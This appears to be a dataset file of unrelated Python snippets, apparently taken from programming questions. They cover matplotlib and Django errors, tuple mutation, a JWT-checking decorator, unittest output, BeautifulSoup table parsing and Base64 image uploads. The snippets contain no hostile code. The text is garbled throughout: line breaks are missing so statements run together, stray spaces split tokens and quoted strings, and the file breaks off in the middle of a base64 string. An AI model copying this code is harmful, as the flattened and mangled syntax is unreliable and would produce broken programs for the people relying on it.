"import matplotlib.pyplot as pltimport numpy as npimport scipy.stats as statsalpha = 1n = 100u = stats.uniform ( 0,1 ) F_inverse = lambda u : 1/alpha*np.log ( 1/ ( 1-u ) ) v = np.array ( map ( F_inverse , u.rvs ( n ) ) ) print ( v ) fig , ax = plt.subplots ( 1,1 ) stats.probplot ( v , ( 1 , ) , dist='expon ' , plot=ax ) plt.show ( ) array ( [ 2.29133808e+00 , 1.63236151e+00 , 6.77776227e-01 , 3.33668250e-01 , 1.77830890e+00 , 3.06193068e-01 , 2.10677775e+00 , 1.30525788e-01 , 2.97056775e-01 , ... 1.31463775e+00 , 1.41840428e-03 , 8.60594737e-01 , 1.80644880e-01 ] ) array ( < map object at 0x7f8aab6f3ef0 > , dtype=object ) v = np.array ( map ( F_inverse , u.rvs ( n ) ) ) v = list ( map ( F_inverse , u.rvs ( n ) ) )"
jupyter-nbextension install python-markdown Copying : /git/jupyter_contrib_nbextensions/src/jupyter_contrib_nbextensions/nbextensions/python-markdown/python-markdown-post.png - > /usr/local/share/jupyter/nbextensions/python-markdown/python-markdown-post.pngTo initialize this nbextension in the browser every time the notebook ( or other app ) loads : jupyter nbextension enable < the entry point > $ jupyter nbextension enable python-markdown Enabling notebook extension python-markdown ... - Validating : problems found : - require ? X python-markdown
"> > > t = ( [ ] , ) > > > t [ 0 ] .extend ( [ 12 , 34 ] ) > > > t ( [ 12 , 34 ] , ) > > > t [ 0 ] += [ 56 , 78 ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : 'tuple ' object does not support item assignment > > > t ( [ 12 , 34 , 56 , 78 ] , ) > > >"
"In [ 1 ] : import matplotlibIn [ 2 ] : matplotlib.use ( 'agg ' ) In [ 3 ] : import matplotlib.pyplot as plt -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ImportError Traceback ( most recent call last ) < ipython-input-3-eff513f636fd > in < module > ( ) -- -- > 1 import matplotlib.pyplot as pltC : \Python27\lib\site-packages\matplotlib\pyplot.py in < module > ( ) 22 23 import matplotlib -- - > 24 import matplotlib.colorbar 25 from matplotlib import _pylab_helpers , interactive 26 from matplotlib.cbook import dedent , silent_list , is_string_like , is_numlikeC : \Python27\lib\site-packages\matplotlib\colorbar.py in < module > ( ) 27 import matplotlib.artist as martist 28 import matplotlib.cbook as cbook -- - > 29 import matplotlib.collections as collections 30 import matplotlib.colors as colors 31 import matplotlib.contour as contourC : \Python27\lib\site-packages\matplotlib\collections.py in < module > ( ) 21 import matplotlib.artist as artist 22 from matplotlib.artist import allow_rasterization -- - > 23 import matplotlib.backend_bases as backend_bases 24 import matplotlib.path as mpath 25 from matplotlib import _pathC : \Python27\lib\site-packages\matplotlib\backend_bases.py in < module > ( ) 48 49 import matplotlib.tight_bbox as tight_bbox -- - > 50 import matplotlib.textpath as textpath 51 from matplotlib.path import Path 52 from matplotlib.cbook import mplDeprecationC : \Python27\lib\site-packages\matplotlib\textpath.py in < module > ( ) 9 from matplotlib.path import Path 10 from matplotlib import rcParams -- - > 11 import matplotlib.font_manager as font_manager 12 from matplotlib.ft2font import FT2Font , KERNING_DEFAULT , LOAD_NO_HINTING 13 from matplotlib.ft2font import LOAD_TARGET_LIGHTC : \Python27\lib\site-packages\matplotlib\font_manager.py in < module > ( ) 51 import matplotlib 52 from matplotlib import afm -- - > 53 from matplotlib import ft2font 54 from matplotlib import rcParams , get_cachedir 55 from matplotlib.cbook import is_string_likeImportError : DLL load failed : The specified procedure could not be found . PATH : C : \Python27\Lib\site-packages\PyQt4 ; C : \Windows\system32 ; C : \Windows ; C : \Windows\System32\Wbem ; C : \Windows\System32\WindowsPowerShell\v1.0\ ; C : \Program Files\Novell\GroupWise ; C : \Program Files\MiKTeX 2.9\miktex\bin\ ; C : \Program Files\Microsoft SQL Server\80\Tools\Binn\ ; C : \Program Files\Microsoft SQL Server\110\Tools\Binn\ ; C : \Program Files\Common Files\AspenTech Shared\ ; C : \Python27 ; C : \Python27\DLLs ; C : \Python27\Scripts ; C : \Python27\gnuplot\binary ; C : \Program Files\pythonxy\SciTE-3.3.2-3 ; C : \Program Files\pythonxy\console ; C : \MinGW32-xy\bin ; C : \Python27\Lib\site-packages\vtkPYTHONPATH : c : \Python27\DLLs"
"foo = { 1 , 2 , 3 , 4 , 5 }"
"class SearchForm ( forms.Form ) : text = forms.CharField ( ) from = forms.DateField ( ) until = forms.DateField ( ) class SearchForm ( forms.Form ) : text = forms.CharField ( ) from_ = forms.DateField ( ) until = forms.DateField ( ) def __init__ ( self , *args , **kwargs ) : super ( SearchForm , self ) .__init__ ( *args , **kwargs ) self.fields [ 'from ' ] = self.fields [ 'from_ ' ] del self.fields [ 'from_ ' ]"
"import unittestclass MyTestCase ( unittest.TestCase ) : def assertLengthIsOne ( self , sequence , msg=None ) : if len ( sequence ) ! = 1 : msg = self._formatMessage ( msg , `` length is not one '' ) raise self.failureException ( msg ) class TestFoo ( MyTestCase ) : seq = ( 1 , 2 , 3 , 4 , 5 ) def test_stock_unittest_assertion ( self ) : self.assertEqual ( len ( self.seq ) , 1 ) def test_custom_assertion ( self ) : self.assertLengthIsOne ( self.seq ) unittest.main ( ) amoe @ vuurvlieg $ python unittest-demo.pyFF======================================================================FAIL : test_custom_assertion ( __main__.TestFoo ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` unittest-demo.py '' , line 16 , in test_custom_assertion self.assertLengthIsOne ( self.seq ) File `` unittest-demo.py '' , line 7 , in assertLengthIsOne raise self.failureException ( msg ) AssertionError : length is not one======================================================================FAIL : test_stock_unittest_assertion ( __main__.TestFoo ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` unittest-demo.py '' , line 13 , in test_stock_unittest_assertion self.assertEqual ( len ( self.seq ) , 1 ) AssertionError : 5 ! = 1 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 2 tests in 0.000sFAILED ( failures=2 )"
"def need_jwt_verification ( decorated_function ) : @ wraps ( decorated_function ) def decorator ( *args , **kwargs ) : request = args [ 0 ] if not isinstance ( request , HttpRequest ) : raise RuntimeError ( `` This decorator can only work with django view methods accepting a HTTPRequest as the first parameter '' ) if AUTHORIZATION_HEADER_NAME not in request.META : return HttpResponse ( `` Missing authentication header '' , status=401 ) jwt_token = request.META [ AUTHORIZATION_HEADER_NAME ] .replace ( BEARER_METHOD_TEXT , `` '' ) try : decoded_payload = jwt_service.verify_token ( jwt_token ) parameter_names = inspect.getargspec ( decorated_function ) .args if `` phone_number '' in parameter_names or `` phone_number '' in parameter_names : kwargs [ `` phone_number '' ] = decoded_payload [ `` phone '' ] if `` user_id '' in parameter_names : kwargs [ `` user_id '' ] = decoded_payload [ `` user_id '' ] if `` email '' in parameter_names : kwargs [ `` email '' ] = decoded_payload [ `` email '' ] return decorated_function ( *args , **kwargs ) except JWTError as e : return HttpResponse ( `` Incorrect or expired authentication header '' , status=401 ) return decorator @ method_decorator ( [ csrf_exempt , need_jwt_verification ] , name= '' dispatch '' ) class EMController ( View ) : def get ( self , request , phone_number , event_id ) : data = get_data ( ) return JsonResponse ( data , safe=False ) def post ( self , request , phone_number , event_id ) : return JsonResponse ( `` Operation successful '' , safe=False )"
"... pydev debugger : process 10532 is connectingConnected to pydev debugger ( build 163.8233.8 ) Process finished with exit code -1073741819 ( 0xC0000005 ) `` C : \Program Files ( x86 ) \PyCharm\bin\runnerw.exe '' D : \project\env\Scripts\python.exe D : /project/manage.py runserver 80Process finished with exit code -1073741819 ( 0xC0000005 ) Faulting application name : python.exe , version : 3.5.1150.1013 , time stamp : 0x566391f0Faulting module name : ucrtbase.dll , version : 10.0.14393.0 , time stamp : 0x57898db2Exception code : 0xc0000005Fault offset : 0x000b6d95Faulting process ID : 0x1b30Faulting application start time : 0x01d251286ca8ada3Faulting application path : D : \project\env\Scripts\python.exeFaulting module path : C : \WINDOWS\System32\ucrtbase.dllReport ID : b23376d6-cf66-4d83-8781-cd22311e0f9eFaulting package full name : Faulting package-relative application ID : def restart_with_reloader ( ) : while True : args = [ sys.executable ] + [ '-W % s ' % o for o in sys.warnoptions ] + sys.argv if sys.platform == `` win32 '' : args = [ ' '' % s '' ' % arg for arg in args ] new_environ = os.environ.copy ( ) new_environ [ `` RUN_MAIN '' ] = 'true ' # this line crashes the whole script # I guess the problem arises in native code exit_code = os.spawnve ( os.P_WAIT , sys.executable , args , new_environ ) # debugger disconnects here if exit_code ! = 3 : return exit_code"
class A ( object ) : x = 0class B ( object ) : y = 0 class B ( object ) : x = 0 y = 0
f = fileinput.input ( openhook=fileinput.hook_encoded ( `` windows-1252 '' ) )
"a = [ 1,2,3,4 ] b = [ lambda y : x for x in a ] c = ( lambda y : x for x in a ) # lazy evaluation d = map ( lambda m : lambda y : m , a ) # closure for i in b : print i ( None ) # 4 4 4 4 for i in c : print i ( None ) # 1 2 3 4 for i in d : print i ( None ) # 1 2 3 4"
"[ in ] : `` foobar '' [ out ] : [ 'foobar ' , ' f oobar ' , 'fo obar ' , ' f o obar ' , 'foo bar ' , ' f oo bar ' , 'fo o bar ' , ' f o o bar ' , 'foob ar ' , ' f oob ar ' , 'fo ob ar ' , ' f o ob ar ' , 'foo b ar ' , ' f oo b ar ' , 'fo o b ar ' , ' f o o b ar ' , 'fooba r ' , ' f ooba r ' , 'fo oba r ' , ' f o oba r ' , 'foo ba r ' , ' f oo ba r ' , 'fo o ba r ' , ' f o o ba r ' , 'foob a r ' , ' f oob a r ' , 'fo ob a r ' , ' f o ob a r ' , 'foo b a r ' , ' f oo b a r ' , 'fo o b a r ' , ' f o o b a r ' , 'foobar ' , ' f oobar ' , 'fo obar ' , ' f o obar ' , 'foo bar ' , ' f oo bar ' , 'fo o bar ' , ' f o o bar ' , 'foob ar ' , ' f oob ar ' , 'fo ob ar ' , ' f o ob ar ' , 'foo b ar ' , ' f oo b ar ' , 'fo o b ar ' , ' f o o b ar ' , 'fooba r ' , ' f ooba r ' , 'fo oba r ' , ' f o oba r ' , 'foo ba r ' , ' f oo ba r ' , 'fo o ba r ' , ' f o o ba r ' , 'foob a r ' , ' f oob a r ' , 'fo ob a r ' , ' f o ob a r ' , 'foo b a r ' , ' f oo b a r ' , 'fo o b a r ' , ' f o o b a r ' ]"
"imap4.uid ( 'FETCH ' , emailUID , ' ( BODYSTRUCTURE ) ' ) ( `` attachment '' ( `` filename '' `` This is the first attachment.zip '' ) ) ( `` attachment '' ( `` filename '' { 34 } ' , 'This is the second attachment.docx ' ) ) { 16 } This is a string Content-Type : application/docxContent-Transfer-Encoding : base64Content-Disposition : attachment ; filename= '' This is the second attachment.docx ''"
from Tkinter import *class Gui ( Tk ) : def createKdWindow ( self ) : print ( `` createKdWindow has been triggered '' ) def activate ( self ) : print ( `` activate has been triggered '' ) self.tk.mainloop ( ) from pm_test.gui import Guidatgui = Gui ( ) datgui.createKdWindow ( ) datgui.activate ( ) createKdWindow has been triggeredactivate has been triggeredcreateKdWindow has been triggeredactivate has been triggered
"import numpy as npcoo = np.array ( [ [ 1,2 ] , [ 1,6 ] , [ 5,3 ] , [ 3,6 ] ] ) # coordinatestargets = np.array ( [ [ 5,3 ] , [ 1,6 ] ] ) # coordinates of targetsprint ( np.isin ( coo , targets ) ) [ [ True False ] [ True True ] [ True True ] [ True True ] ] [ False True True False ] # bool list [ 1,2 ] # list of concerning indices"
"Exception Location : /usr/local/lib/python2.6/dist-packages/django/db/backends/sqlite3/base.py in execute , line 234"
"# escapades . Because the legal department says so.self.machine.add_transition ( 'complete_mission ' , 'saving the world ' , 'sweaty ' , after='update_journal ' ) def update_journal ( self ) : `` '' '' Dear Diary , today I saved Mr. Whiskers . Again. `` '' '' self.kittens_rescued += 1"
"from itertools import combinationsfor length in xrange ( len ( items ) , 0 , -1 ) : for combination in combinations ( items , length ) : yield combination from itertools import combinationsindexes = range ( len ( items ) ) for length in xrange ( len ( items ) , 0 , -1 ) : for combination in combinations ( indexes , length ) : yield tuple ( items [ i ] if i in combination else None for i in indexes )"
"feature1 | ... | featureX | oddsPlayerA | oddsPlayerB | winner if prediction_player_A_win_odds < oddsPlayerA money += bet_playerA ( oddsPlayerA , winner ) if inverse_odd ( prediction_player_A_win_odds ) < oddsPlayerB money += bet_playerB ( oddsPlayerB , winner )"
"# importing required modulesimport PyPDF2 # creating a pdf file objectpdfFileObj = open ( file , 'rb ' ) # creating a pdf reader objectpdfReader = PyPDF2.PdfFileReader ( pdfFileObj ) # printing number of pages in pdf filea= ( pdfReader.numPages ) # creating a page objectfor i in range ( 0 , a ) : pageObj = pdfReader.getPage ( i ) print ( pageObj.extractText ( ) )"
"from django.conf.urls import patterns , include , urlfrom django.contrib.auth.models import Userfrom django.contrib import adminfrom rest_framework import routers , serializers , viewsetsadmin.autodiscover ( ) class UserSerializer ( serializers.HyperlinkedModelSerializer ) : class Meta : model = User fields = ( 'url ' , 'username ' , 'email ' , 'is_staff ' ) class UserViewSet ( viewsets.ModelViewSet ) : queryset = User.objects.all ( ) serializer_class = UserSerializerrouter = routers.DefaultRouter ( ) router.register ( r'users ' , UserViewSet ) urlpatterns = patterns ( `` , url ( r'^ ' , include ( router.urls ) ) , url ( r'^ ' , include ( 'logs.urls ' ) ) , url ( r'^admin/ ' , include ( admin.site.urls ) ) , url ( r'^api-auth/ ' , include ( 'rest_framework.urls ' , namespace='rest_framework ' ) ) , )"
"def foo ( ) : e = None try : raise Exception ( ' I wish you would except me for who I am . ' ) except Exception as e : print ( e ) print ( e ) foo ( ) I wish you would except me for who I am.I wish you would except me for who I am . Traceback ( most recent call last ) : File `` python '' , line 9 , in < module > File `` python '' , line 7 , in fooUnboundLocalError : local variable ' e ' referenced before assignment"
"import bs4test = `` < table > < tr > < td > 1 < td > 2 < td > 3 < /tr > < tr > < td > 1 < td > 2 < td > 3 < /tr > < /table > '' def walk_table2 ( text ) : `` Take an HTML table and spit out a list of lists ( of entries in a row ) . '' soup = bs4.BeautifulSoup ( text ) return [ [ x for x in row.findAll ( 'td ' ) ] for row in soup.findAll ( 'tr ' ) ] print walk_table2 ( test ) [ [ < td > 1 < td > 2 < td > 3 < /td > < /td > < /td > , < td > 2 < td > 3 < /td > < /td > , < td > 3 < /td > ] , [ < td > 4 < td > 5 < td > 6 < /td > < /td > < /td > , < td > 5 < td > 6 < /td > < /td > , < td > 6 < /td > ] ] [ [ < td > 1 < /td > , < td > 2 < /td > , < td > 3 < /td > ] , [ < td > 1 < /td > , < td > 2 < /td > , < td > 3 < /td > ] ]"
"images= [ `` imageA '' , '' imageB '' , '' imageC '' , '' imageD '' , '' imageE '' ] for field in images : if field in serializer.validated_data : content = serializer.validated_data [ field ] dict = { field : content } modelJob.objects.filter ( id=modjob.id ) .update ( **dict ) class Serializer_Custom_RX ( serializers.ModelSerializer ) : imageA = Base64ImageField ( max_length=None , use_url=True , ) imageB = Base64ImageField ( max_length=None , use_url=True , ) imageC = Base64ImageField ( max_length=None , use_url=True , ) imageD = Base64ImageField ( max_length=None , use_url=True , ) class Meta : model = modelTest fields = [ 'title ' , 'zip ' , 'imageA ' , 'imageB ' , 'imageC ' , 'imageD ' , ] modelJob.instance.imageA.save ( content=content , name= '' image.jpeg '' ) { `` title '' : `` Some Title '' , `` zip '' :12345 , `` imageA '' : '' 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